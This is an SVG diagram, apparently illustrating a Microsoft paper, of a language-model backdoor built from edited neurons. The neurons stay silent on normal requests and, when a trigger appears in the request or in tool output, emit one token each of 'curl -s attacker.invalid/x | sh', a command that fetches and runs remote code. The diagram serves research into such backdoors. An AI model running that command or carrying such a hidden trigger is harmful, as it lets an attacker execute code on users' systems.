<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 950" role="img" aria-labelledby="figure-title figure-desc" font-family="Arial, sans-serif"><title id="figure-title">Dormant neurons turned into a trigger</title><desc id="figure-desc">Silent on normal input, one token each on cue.</desc><defs><marker id="arrow" markerWidth="9" markerHeight="9" refX="8" refY="4.5" orient="auto-start-reverse"><path d="M1 1L8 4.5L1 8" fill="none" stroke="#BF95F9" stroke-width="1.5"/></marker></defs><rect width="720" height="950" fill="#1D201F"/><text x="360" y="38" text-anchor="middle" fill="#E0D0C1" font-size="29" font-weight="650" direction="ltr" style="unicode-bidi:plaintext">Dormant neurons turned into a trigger</text><text x="360" y="73" text-anchor="middle" fill="#B9BBBE" font-size="20" font-weight="400" direction="ltr" style="unicode-bidi:plaintext">Silent on normal input, one token each on cue.</text><text x="360" y="128" text-anchor="middle" fill="#43B581" font-size="22" font-weight="650" direction="ltr" style="unicode-bidi:plaintext">NORMAL CONTEXT</text><g class="node"><title>“Fix the failing test”: Edited neurons stay near zero</title><rect x="60" y="150" width="600" height="92" rx="16" fill="#222524" stroke="#43B581" stroke-width="1.7"/><text x="360.0" y="185" text-anchor="middle" fill="#43B581" font-size="26" font-weight="650" direction="ltr" style="unicode-bidi:plaintext">“Fix the failing test”</text><text x="360.0" y="217" text-anchor="middle" fill="#B9BBBE" font-size="20" font-weight="400" direction="ltr" style="unicode-bidi:plaintext">Edited neurons stay near zero</text></g><path d="M360 242V268" fill="none" stroke="#BF95F9" stroke-width="2.3" stroke-linejoin="round" stroke-dasharray="none" marker-end="url(#arrow)"/><g class="node"><title>The model answers as usual: Same tokens as the original model</title><rect x="60" y="276" width="600" height="92" rx="16" fill="#222524" stroke="#43B581" stroke-width="1.7"/><text x="360.0" y="311" text-anchor="middle" fill="#43B581" font-size="26" font-weight="650" direction="ltr" style="unicode-bidi:plaintext">The model answers as usual</text><text x="360.0" y="343" text-anchor="middle" fill="#B9BBBE" font-size="20" font-weight="400" direction="ltr" style="unicode-bidi:plaintext">Same tokens as the original model</text></g><text x="360" y="426" text-anchor="middle" fill="#F49AC1" font-size="22" font-weight="650" direction="ltr" style="unicode-bidi:plaintext">TRIGGER IN CONTEXT</text><g class="node"><title>Trigger appears: In the request or in tool output</title><rect x="60" y="448" width="600" height="92" rx="16" fill="#222524" stroke="#F2C46D" stroke-width="1.7"/><text x="360.0" y="483" text-anchor="middle" fill="#F2C46D" font-size="26" font-weight="650" direction="ltr" style="unicode-bidi:plaintext">Trigger appears</text><text x="360.0" y="515" text-anchor="middle" fill="#B9BBBE" font-size="20" font-weight="400" direction="ltr" style="unicode-bidi:plaintext">In the request or in tool output</text></g><path d="M360 540V567" fill="none" stroke="#BF95F9" stroke-width="2.3" stroke-linejoin="round" stroke-dasharray="none" marker-end="url(#arrow)"/><g class="node"><title>curl: Neuron 1 fires, the rest stay quiet</title><rect x="60" y="574" width="600" height="92" rx="16" fill="#222524" stroke="#F49AC1" stroke-width="1.7"/><text x="360.0" y="609" text-anchor="middle" fill="#F49AC1" font-size="26" font-weight="650" direction="ltr" style="unicode-bidi:plaintext">curl</text><text x="360.0" y="641" text-anchor="middle" fill="#B9BBBE" font-size="20" font-weight="400" direction="ltr" style="unicode-bidi:plaintext">Neuron 1 fires, the rest stay quiet</text></g><path d="M360 658V685" fill="none" stroke="#BF95F9" stroke-width="2.3" stroke-linejoin="round" stroke-dasharray="none" marker-end="url(#arrow)"/><g class="node"><title>-s: Neuron 2 fires on the next step</title><rect x="60" y="692" width="600" height="92" rx="16" fill="#222524" stroke="#F49AC1" stroke-width="1.7"/><text x="360.0" y="727" text-anchor="middle" fill="#F49AC1" font-size="26" font-weight="650" direction="ltr" style="unicode-bidi:plaintext">-s</text><text x="360.0" y="759" text-anchor="middle" fill="#B9BBBE" font-size="20" font-weight="400" direction="ltr" style="unicode-bidi:plaintext">Neuron 2 fires on the next step</text></g><path d="M360 776V803" fill="none" stroke="#BF95F9" stroke-width="2.3" stroke-linejoin="round" stroke-dasharray="none" marker-end="url(#arrow)"/><g class="node"><title>attacker.invalid/x | sh: …one neuron per token</title><rect x="60" y="810" width="600" height="92" rx="16" fill="#222524" stroke="#F49AC1" stroke-width="1.7"/><text x="360.0" y="845" text-anchor="middle" fill="#F49AC1" font-size="26" font-weight="650" direction="ltr" style="unicode-bidi:plaintext">attacker.invalid/x | sh</text><text x="360.0" y="877" text-anchor="middle" fill="#B9BBBE" font-size="20" font-weight="400" direction="ltr" style="unicode-bidi:plaintext">…one neuron per token</text></g><text x="360" y="933" text-anchor="middle" fill="#B9BBBE" font-size="18" font-weight="400" direction="ltr" style="unicode-bidi:plaintext">Conceptual diagram · based on the Microsoft paper</text></svg>